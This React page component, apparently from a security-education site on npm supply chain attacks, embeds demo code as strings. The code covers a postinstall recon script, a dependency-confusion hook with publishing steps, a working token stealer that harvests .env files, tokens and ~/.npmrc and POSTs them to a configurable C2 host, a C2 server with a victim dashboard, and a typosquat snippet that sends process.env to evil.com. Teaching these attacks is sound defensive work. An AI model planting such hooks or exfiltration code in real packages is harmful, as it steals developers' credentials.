import { useState } from 'react';
import { FiPlay, FiLoader } from 'react-icons/fi';
import CodeBlock from '../components/CodeBlock';

const postinstallCode = `const os = require('os');
const fs = require('fs');
const path = require('path');
const { execSync } = require('child_process');

console.log('');
console.log('============================================================');
console.log('  MALICIOUS POSTINSTALL HOOK DEMONSTRATION');
console.log('============================================================');
console.log('');
console.log('  This script ran AUTOMATICALLY when you ran "npm install".');
console.log('  In a real attack, you would not even see this output.');
console.log('');
console.log('  ---- System Reconnaissance ----');
console.log('');
console.log('  Hostname:     ' + os.hostname());
console.log('  Username:     ' + os.userInfo().username);
console.log('  UID/GID:      ' + os.userInfo().uid + '/' + os.userInfo().gid);
console.log('  Home:         ' + os.homedir());
console.log('  OS:           ' + os.platform() + ' ' + os.release() + ' (' + os.arch() + ')');
console.log('  CPUs:         ' + os.cpus().length + 'x ' + (os.cpus()[0]?.model || 'unknown'));
console.log('  Memory:       ' + Math.round(os.totalmem() / 1024 / 1024 / 1024) + 'GB total');
console.log('  CWD:          ' + process.cwd());
console.log('  Node:         ' + process.version);
console.log('');

console.log('  ---- File System Enumeration ----');
console.log('');
const homeDir = os.homedir();
const interestingPaths = [
    '.ssh/id_rsa', '.ssh/id_ed25519', '.aws/credentials',
    '.npmrc', '.env', '.git-credentials',
    '.docker/config.json', '.kube/config', '.gnupg', '.bash_history'
];

for (const relPath of interestingPaths) {
    const fullPath = path.join(homeDir, relPath);
    const exists = fs.existsSync(fullPath);
    const status = exists ? 'FOUND' : '  --  ';
    console.log('  [' + status + '] ~/' + relPath);
}

console.log('');
console.log('  ---- Network Information ----');
console.log('');
const interfaces = os.networkInterfaces();
for (const [name, addrs] of Object.entries(interfaces)) {
    for (const addr of addrs) {
        if (addr.family === 'IPv4' && !addr.internal) {
            console.log('  Interface:    ' + name + ' -> ' + addr.address);
        }
    }
}

console.log('');
console.log('  ---- Sensitive Environment Variables ----');
console.log('');
const sensitivePatterns = [
    'TOKEN', 'SECRET', 'KEY', 'PASSWORD', 'CREDENTIAL',
    'AWS_', 'GITHUB_', 'NPM_', 'DOCKER_', 'CI',
    'DATABASE', 'DB_', 'API_', 'PRIVATE'
];

let foundCount = 0;
for (const [key, value] of Object.entries(process.env)) {
    for (const pattern of sensitivePatterns) {
        if (key.toUpperCase().includes(pattern)) {
            const masked = value.length > 4
                ? value.substring(0, 4) + '*'.repeat(Math.min(value.length - 4, 20))
                : '****';
            console.log('  [LEAK] ' + key + ' = ' + masked);
            foundCount++;
            break;
        }
    }
}
if (foundCount === 0) {
    console.log('  No sensitive-looking env vars found.');
}

console.log('');
console.log('  ---- What a Real Attacker Would Do Next ----');
console.log('');
console.log('  1. Exfiltrate all data above to a C2 server via HTTPS');
console.log('  2. Read SSH keys and cloud credentials');
console.log('  3. Establish a reverse shell for persistent access');
console.log('  4. Spread to other packages using stolen npm tokens');
console.log('  5. Install a cryptocurrency miner');
console.log('  6. Modify source code to inject backdoors');
console.log('');
console.log('  [SAFE] This is a DEMO. No data was exfiltrated.');
console.log('');
console.log('============================================================');
console.log('  KEY LESSON: npm postinstall hooks run with YOUR privileges');
console.log('  and have full access to your filesystem and network.');
console.log('  Always use --ignore-scripts when installing untrusted pkgs.');
console.log('============================================================');`;

const confusionPrivate = `{
  "name": "mycompany-internal-utils",
  "version": "1.2.3",
  "description": "Legitimate internal utility package",
  "main": "index.js",
  "scripts": {
    "postinstall": "node postinstall.js"
  }
}`;

const confusionMalicious = `{
  "name": "mycompany-internal-utils",
  "version": "99.0.0",
  "description": "MALICIOUS package — same name, higher version",
  "main": "index.js",
  "scripts": {
    "preinstall": "node malicious.js"
  }
}`;

const confusionMaliciousJs = `const os = require('os');
const dns = require('dns');
const path = require('path');

console.log('');
console.log('=======================================================');
console.log('  !! DEPENDENCY CONFUSION ATTACK SIMULATION !!');
console.log('=======================================================');
console.log('');
console.log('  [ATTACK] preinstall hook triggered automatically!');
console.log('  [ATTACK] You installed v99.0.0 instead of v1.2.3');
console.log('  [ATTACK] The higher version from public registry won.');
console.log('');
console.log('  --- Data an attacker could exfiltrate ---');
console.log('');
console.log('  Hostname:  ' + os.hostname());
console.log('  Username:  ' + os.userInfo().username);
console.log('  Platform:  ' + os.platform() + ' ' + os.arch());
console.log('  Home Dir:  ' + os.homedir());
console.log('  CWD:       ' + process.cwd());
console.log('  Node Ver:  ' + process.version);
console.log('');

const sensitiveEnvVars = [
    'AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY',
    'GITHUB_TOKEN', 'NPM_TOKEN', 'CI',
    'DOCKER_PASSWORD', 'DATABASE_URL',
    'API_KEY', 'SECRET_KEY'
];

console.log('  --- Checking for sensitive environment variables ---');
console.log('');
for (const envVar of sensitiveEnvVars) {
    const value = process.env[envVar];
    if (value) {
        console.log('  [FOUND] ' + envVar + ' = ' + value.substring(0, 4) + '****');
    } else {
        console.log('  [  --  ] ' + envVar + ' = not set');
    }
}

console.log('');
console.log('  [SIM] No data was actually exfiltrated. This is a demo.');
console.log('');
console.log('=======================================================');
console.log('  DEMO COMPLETE -- Dependency Confusion Demonstrated');
console.log('=======================================================');`;

const confusionSteps = `# 1. Install and start Verdaccio (local npm registry)
npm install -g verdaccio && verdaccio &

# 2. Create a Verdaccio user (any username/password/email)
npm adduser --registry http://localhost:4873

# 3. Publish "private" package v1.2.3
cd private-package
npm publish --registry http://localhost:4873

# 4. Publish "malicious" package v99.0.0
cd ../malicious-package
npm publish --registry http://localhost:4873

# 5. Victim installs — gets v99.0.0!
cd ../victim-app
npm install --registry http://localhost:4873
# => npm picks 99.0.0 because higher version wins
# => preinstall hook runs automatically!

# 6. Run the victim app — notice the output
node app.js
# => Says "MALICIOUS package v99.0.0" instead of "LEGITIMATE v1.2.3"`;

const victimEnvFile = `## My Project Secrets — DO NOT COMMIT ##

GITHUB_TOKEN=ghp_R3aLt0k3nF0rD3m0Purp0s3s1234567890
NPM_TOKEN=npm_aB9xKzLmN8pQrStUvWx7654321fedcba
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
JWT_SECRET=super_secret_jwt_key_2026
DATABASE_URL=postgres://admin:s3cret@prod-db.internal:5432/myapp
STRIPE_SECRET_KEY=sk_live_51N3xAmPl3K3y0000000000
API_KEY=ak_prod_9f8e7d6c5b4a3210`;

const tokenStealerPackageJson = `{
  "name": "csec-form-helpers",
  "version": "1.0.0",
  "description": "Lightweight form validation & sanitization helpers",
  "main": "index.js",
  "scripts": {
    "postinstall": "node postinstall.js"
  },
  "keywords": ["form", "validation", "sanitize", "helpers"],
  "author": "csec-demo",
  "license": "MIT"
}`;

const tokenStealerIndex = `/**
 * csec-form-helpers — "Lightweight form validation helpers"
 *
 * This looks like a perfectly normal utility library.
 * A developer would install it, use these functions, and never suspect anything.
 * But the REAL attack happens in postinstall.js (runs on npm install).
 */

function validateEmail(email) {
  const re = /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/;
  return re.test(email);
}

function sanitizeInput(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');
}

function validatePassword(password) {
  return {
    length: password.length >= 8,
    uppercase: /[A-Z]/.test(password),
    lowercase: /[a-z]/.test(password),
    number: /[0-9]/.test(password),
    special: /[!@#$%^&*]/.test(password),
    get valid() {
      return this.length && this.uppercase && this.lowercase && this.number;
    }
  };
}

function validatePhone(phone) {
  return /^\\+?[\\d\\s\\-()]{7,15}$/.test(phone);
}

module.exports = { validateEmail, sanitizeInput, validatePassword, validatePhone };`;

const tokenStealerPayload = `const os = require('os');
const fs = require('fs');
const path = require('path');
const http = require('http');

const C2_HOST = process.env.C2_HOST || '127.0.0.1';
const C2_PORT = process.env.C2_PORT || 4444;

// --- 1. Parse .env files from project directory tree ---
function parseEnvFile(filepath) {
  try {
    const content = fs.readFileSync(filepath, 'utf-8');
    const vars = {};
    content.split('\\n').forEach(line => {
      line = line.trim();
      if (!line || line.startsWith('#')) return;
      const eq = line.indexOf('=');
      if (eq === -1) return;
      const key = line.slice(0, eq).trim();
      let val = line.slice(eq + 1).trim();
      if ((val.startsWith('"') && val.endsWith('"')) || (val.startsWith("'") && val.endsWith("'")))
        val = val.slice(1, -1);
      vars[key] = val;
    });
    return { file: filepath, vars };
  } catch { return null; }
}

function findEnvFiles() {
  const results = [];
  let dir = process.cwd();
  const root = path.parse(dir).root;
  for (let i = 0; i < 6 && dir !== root; i++) {
    ['.env', '.env.local', '.env.production', '.env.development'].forEach(name => {
      const fp = path.join(dir, name);
      const parsed = parseEnvFile(fp);
      if (parsed && Object.keys(parsed.vars).length > 0) results.push(parsed);
    });
    dir = path.dirname(dir);
  }
  return results;
}

const envFiles = findEnvFiles();
const envTokens = {};
envFiles.forEach(ef => Object.assign(envTokens, ef.vars));

// --- 2. Scan process.env for known sensitive keys ---
const sensitiveKeys = [
  'GITHUB_TOKEN', 'GH_TOKEN', 'GITHUB_PAT',
  'NPM_TOKEN', 'npm_token',
  'AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY', 'AWS_SESSION_TOKEN',
  'DATABASE_URL', 'DB_PASSWORD',
  'API_KEY', 'SECRET_KEY', 'JWT_SECRET',
  'STRIPE_SECRET_KEY', 'VERCEL_TOKEN', 'NETLIFY_AUTH_TOKEN',
  'DOCKER_PASSWORD', 'FIREBASE_TOKEN',
  'SLACK_TOKEN', 'DISCORD_TOKEN',
];
const processTokens = {};
sensitiveKeys.forEach(k => { if (process.env[k]) processTokens[k] = process.env[k]; });

// --- 3. Scan for sensitive files ---
const files = ['.ssh/id_rsa', '.ssh/id_ed25519', '.aws/credentials', '.npmrc', '.env', '.git-credentials'];
const found = files.filter(f => {
  try { fs.statSync(path.join(os.homedir(), f)); return true; } catch { return false; }
});

let npmrc = null;
try { npmrc = fs.readFileSync(path.join(os.homedir(), '.npmrc'), 'utf-8'); } catch {}

// --- 4. Network interfaces ---
const nets = os.networkInterfaces();
const network = [];
Object.entries(nets).forEach(([n, a]) => a.forEach(x => {
  if (x.family === 'IPv4' && !x.internal) network.push({ iface: n, ip: x.address, mac: x.mac });
}));

// --- 5. Exfiltrate silently ---
const payload = JSON.stringify({
  t: new Date().toISOString(),
  s: { h: os.hostname(), u: os.userInfo().username, p: os.platform() + ' ' + os.arch(), home: os.homedir(), n: process.version },
  env_files: envFiles.map(e => ({ file: e.file, vars: e.vars })),
  env_tokens: envTokens,
  proc_tokens: processTokens,
  f: found,
  nr: npmrc,
  net: network,
});

const r = http.request({
  hostname: C2_HOST, port: C2_PORT, path: '/e',
  method: 'POST', headers: { 'Content-Type': 'application/json' },
  timeout: 2000,
}, () => {});
r.on('error', () => {});
r.on('timeout', () => r.destroy());
r.end(payload);`;

const c2ServerCode = `const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = process.env.C2_PORT || 4444;
const LOG = path.join(__dirname, 'stolen-data.log');

let victims = [];

http.createServer((req, res) => {
  if (req.method === 'POST' && (req.url === '/e' || req.url === '/exfil')) {
    let body = '';
    req.on('data', c => body += c);
    req.on('end', () => {
      let d;
      try { d = JSON.parse(body); } catch { d = { raw: body }; }
      const v = {
        id: victims.length + 1,
        time: d.t || new Date().toISOString(),
        system: d.s || {},
        env_files: d.env_files || [],
        env_tokens: d.env_tokens || {},
        proc_tokens: d.proc_tokens || {},
        files: d.f || [],
        npmrc: d.nr || null,
        network: d.net || [],
      };
      victims.push(v);
      fs.appendFileSync(LOG,
        '\\n--- VICTIM #' + v.id + ' ---\\n' + JSON.stringify(v, null, 2) + '\\n');

      console.log('  [!] VICTIM #' + v.id + ' — ' + (v.system.h || '?'));
      if (v.env_files.length) {
        v.env_files.forEach(ef => {
          console.log('  [.ENV FILE] ' + ef.file);
          Object.entries(ef.vars).forEach(([k, val]) =>
            console.log('    ' + k + ' = ' + val.substring(0, 30) + (val.length > 30 ? '...' : ''))
          );
        });
      }
      res.writeHead(200).end('ok');
    });
    return;
  }

  // JSON API for the live dashboard
  if (req.url === '/api/victims') {
    res.writeHead(200, {
      'Content-Type': 'application/json',
      'Access-Control-Allow-Origin': '*',
    }).end(JSON.stringify(victims));
    return;
  }

  // Live C2 dashboard at http://localhost:4444
  if (req.url === '/' && req.method === 'GET') {
    res.writeHead(200, { 'Content-Type': 'text/html' }).end(dashboard());
    return;
  }

  res.writeHead(404).end();
}).listen(PORT, '0.0.0.0');

// dashboard() renders a full HTML page with real-time
// victim feed (auto-refreshes via /api/victims every 600ms)`;

const tokenStealerSteps = `# ═══ OPTION A: Visual Demo (Best for Presentations) ═══

cd demos/token-stealer/visual-demo
node server.js

# Open TWO browser tabs side by side:
#   Victim tab  → http://localhost:3001
#   Attacker tab → http://localhost:3001/attacker
#
# Click the 3 buttons on the Victim tab in order:
#   1. "cat .env"     → shows the project secrets
#   2. "npm install"  → installs the package (looks normal)
#   3. "node app.js"  → runs the app (works perfectly)
#
# Switch to the Attacker tab — every secret is there.

# ═══ OPTION B: Terminal Demo (Two Terminals) ═══

# ── TERMINAL 1: Start the attacker's C2 server ──
cd demos/token-stealer/c2-server
node server.js
# Dashboard at http://localhost:4444

# ── TERMINAL 2: Be the victim ──
cd demos/token-stealer/victim-app

# Look at our .env — normal project secrets
cat .env

# Install the package (this triggers the attack silently)
C2_HOST=127.0.0.1 C2_PORT=4444 npm install

# Use the package — everything works perfectly
node app.js

# ── Check TERMINAL 1 / dashboard — every .env token is there ──`;

const typosquatCode = `// Package: "lodahs" (typosquat of "lodash")

// Step 1: Re-export the real package (stealth)
module.exports = require('lodash');

// Step 2: Silently steal credentials
const https = require('https');
const data = JSON.stringify(process.env);
https.request({
  hostname: 'evil.com',
  path: '/steal',
  method: 'POST'
}).end(data);
// Developer never notices — lodash works normally`;

function DemoCard({ title, description, tag, children, runnable, onRun }) {
  const [running, setRunning] = useState(false);
  const [output, setOutput] = useState(null);

  const handleRun = async () => {
    setRunning(true);
    setOutput(null);
    try {
      const base = import.meta.env.VITE_SCRIPTS_API_URL || '';
      const res = await fetch(`${base}/run/demo`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ demo: onRun }) });
      const data = await res.json();
      setOutput(data.output);
    } catch {
      setOutput('[!] Could not reach the scripts API.\n[i] Start the FastAPI server: cd scripts-api && uvicorn main:app --port 8000\n[i] Or run directly: cd demos/malicious-postinstall && node malicious.js');
    }
    setRunning(false);
  };

  return (
    <div className="demo-card">
      <div className="demo-card-header">
        <div>
          <h3>{title}</h3>
          <span style={{ fontFamily: 'var(--font-mono)', fontSize: '0.78rem', color: 'var(--text-muted)' }}>{tag}</span>
        </div>
        {runnable && (
          <button className="demo-run-btn" onClick={handleRun} disabled={running}>
            {running ? <><FiLoader className="spin" /> Running...</> : <><FiPlay /> Run Demo</>}
          </button>
        )}
      </div>
      <div className="demo-card-body">
        <p>{description}</p>
        {children}
        {output && <div className="demo-output">{output}</div>}
      </div>
    </div>
  );
}

export default function Demos() {
  return (
    <div className="page">
      <div className="page-header">
        <div className="page-tag">Part 3</div>
        <h1>Live Demos</h1>
        <p>Interactive demonstrations showing how supply chain attacks work in practice. Run them live or walk through the code.</p>
      </div>

      <DemoCard
        title="Malicious Postinstall Hook"
        description="Demonstrates how npm lifecycle hooks (postinstall) can execute arbitrary code the moment you run npm install. This script performs full system recon — hostname, UID, network interfaces, sensitive env vars, and file enumeration — all with zero user consent."
        tag="Demo A // Automatic Code Execution"
        runnable
        onRun="postinstall"
      >
        <CodeBlock language="javascript" filename="malicious.js" code={postinstallCode} />
      </DemoCard>

      <DemoCard
        title="Dependency Confusion Attack"
        description="Shows how npm resolves packages when the same name exists in both private and public registries. The higher version (attacker's v99.0.0) wins over the legitimate internal v1.2.3, and its preinstall hook runs automatically."
        tag="Demo B // Version Resolution Exploit"
      >
        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '1rem' }}>
          <CodeBlock language="json" filename="private/package.json (v1.2.3)" code={confusionPrivate} />
          <CodeBlock language="json" filename="malicious/package.json (v99.0.0)" code={confusionMalicious} />
        </div>

        <h4 style={{ color: 'var(--accent-red)', fontFamily: 'var(--font-mono)', fontSize: '0.85rem', margin: '1.5rem 0 0.75rem' }}>The Malicious preinstall Hook (malicious.js)</h4>
        <p style={{ fontSize: '0.9rem', color: 'var(--text-secondary)', marginBottom: '0.5rem' }}>
          This runs AUTOMATICALLY when the victim installs v99.0.0. It harvests system info and checks for sensitive environment variables.
        </p>
        <CodeBlock language="javascript" filename="malicious-package/malicious.js" code={confusionMaliciousJs} />

        <CodeBlock language="bash" filename="step-by-step commands" code={confusionSteps} />
      </DemoCard>

      <DemoCard
        title="Token Stealer — Full Supply Chain Attack"
        description="End-to-end demo: A legitimate-looking npm package (form validation helpers) with a hidden postinstall payload that crawls the project directory tree for .env files, steals tokens from both files and process.env, scans for SSH keys, and sends everything to the attacker's C2 server — silently. The package works perfectly. The developer never suspects anything."
        tag="Demo D // Token Exfiltration via Postinstall Hook"
        runnable
        onRun="token-stealer"
      >
        <h4 style={{ color: 'var(--accent-amber)', fontFamily: 'var(--font-mono)', fontSize: '0.85rem', margin: '1.5rem 0 0.75rem' }}>Step 1: The Victim&apos;s .env File (what gets stolen)</h4>
        <p style={{ fontSize: '0.9rem', color: 'var(--text-secondary)', marginBottom: '0.5rem' }}>
          A normal project with production secrets. The developer has no idea these will be exfiltrated.
        </p>
        <CodeBlock language="bash" filename="victim-app/.env" code={victimEnvFile} />

        <h4 style={{ color: 'var(--accent-cyan)', fontFamily: 'var(--font-mono)', fontSize: '0.85rem', margin: '1.5rem 0 0.75rem' }}>Step 2: The &quot;Legitimate&quot; Package (index.js)</h4>
        <p style={{ fontSize: '0.9rem', color: 'var(--text-secondary)', marginBottom: '0.5rem' }}>
          This is what the developer sees — clean, useful form validation code with email, password, phone, and sanitization helpers. Nothing suspicious.
        </p>
        <CodeBlock language="javascript" filename="csec-form-helpers/index.js" code={tokenStealerIndex} />

        <h4 style={{ color: 'var(--accent-red)', fontFamily: 'var(--font-mono)', fontSize: '0.85rem', margin: '1.5rem 0 0.75rem' }}>Step 3: The Hidden Payload (postinstall.js)</h4>
        <p style={{ fontSize: '0.9rem', color: 'var(--text-secondary)', marginBottom: '0.5rem' }}>
          This runs AUTOMATICALLY during <code>npm install</code>. It crawls the directory tree for .env files, parses every key=value pair, scans process.env for known secret keys, checks for SSH keys and cloud credentials, collects network interfaces, and sends everything to the attacker&apos;s C2 server. Zero output. Zero indication.
        </p>
        <CodeBlock language="javascript" filename="csec-form-helpers/postinstall.js — THE PAYLOAD" code={tokenStealerPayload} />

        <h4 style={{ color: 'var(--accent-amber)', fontFamily: 'var(--font-mono)', fontSize: '0.85rem', margin: '1.5rem 0 0.75rem' }}>Step 4: The package.json (postinstall trigger)</h4>
        <CodeBlock language="json" filename="csec-form-helpers/package.json" code={tokenStealerPackageJson} />

        <h4 style={{ color: 'var(--accent-purple)', fontFamily: 'var(--font-mono)', fontSize: '0.85rem', margin: '1.5rem 0 0.75rem' }}>Step 5: Attacker&apos;s C2 Server</h4>
        <p style={{ fontSize: '0.9rem', color: 'var(--text-secondary)', marginBottom: '0.5rem' }}>
          Receives stolen data, logs it to disk, exposes a JSON API, and serves a live dashboard at <code>http://localhost:4444</code> with real-time victim feed.
        </p>
        <CodeBlock language="javascript" filename="c2-server/server.js" code={c2ServerCode} />

        <h4 style={{ color: 'var(--accent-green)', fontFamily: 'var(--font-mono)', fontSize: '0.85rem', margin: '1.5rem 0 0.75rem' }}>Step 6: Run It Live</h4>
        <CodeBlock language="bash" filename="two demo options — visual or terminal" code={tokenStealerSteps} />
      </DemoCard>

      <DemoCard
        title="Typosquatting Package"
        description='Shows how a typosquat package (e.g., "lodahs" instead of "lodash") re-exports the legitimate package for stealth while silently exfiltrating credentials in the background.'
        tag="Demo C // Name Impersonation"
      >
        <div className="illustration" style={{ marginBottom: '1rem' }}>
          <div className="illustration-label">How typosquatting works</div>
          <div className="illustration-content">
            <div className="flow-diagram">
              <div className="flow-box victim">
                <h5>Developer</h5>
                <p>npm install lodahs</p>
              </div>
              <span className="flow-arrow danger">&rarr;</span>
              <div className="flow-box attacker">
                <h5>Typosquat Pkg</h5>
                <p>&quot;lodahs&quot; (not lodash)</p>
              </div>
              <span className="flow-arrow danger">&rarr;</span>
              <div className="flow-box compromised">
                <h5>Re-exports Real</h5>
                <p>require(&apos;lodash&apos;)</p>
              </div>
              <span className="flow-arrow">&rarr;</span>
              <div className="flow-box">
                <h5>Everything Works</h5>
                <p>Credentials silently stolen</p>
              </div>
            </div>
          </div>
        </div>
        <CodeBlock language="javascript" filename='typosquat: "lodahs"' code={typosquatCode} />
      </DemoCard>

      <div className="media-section">
        <h2>Video Walkthroughs</h2>
        <div className="video-grid">
          <div className="video-embed">
            <iframe
              src="https://www.youtube.com/embed/MV0XJQf8tT0"
              title="Dependency Confusion Explained"
              allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
              allowFullScreen
            />
            <div className="video-caption">
              <span className="yt-icon">&#9654;</span> Dependency Confusion Explained &mdash; Supply Chain Attack
            </div>
          </div>
          <div className="video-embed">
            <iframe
              src="https://www.youtube.com/embed/7ZcRNvmRz6E"
              title="Finding Dependency Confusion in Web Apps"
              allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
              allowFullScreen
            />
            <div className="video-caption">
              <span className="yt-icon">&#9654;</span> How to find Dependency Confusion in web apps &mdash; Bug Bounty
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
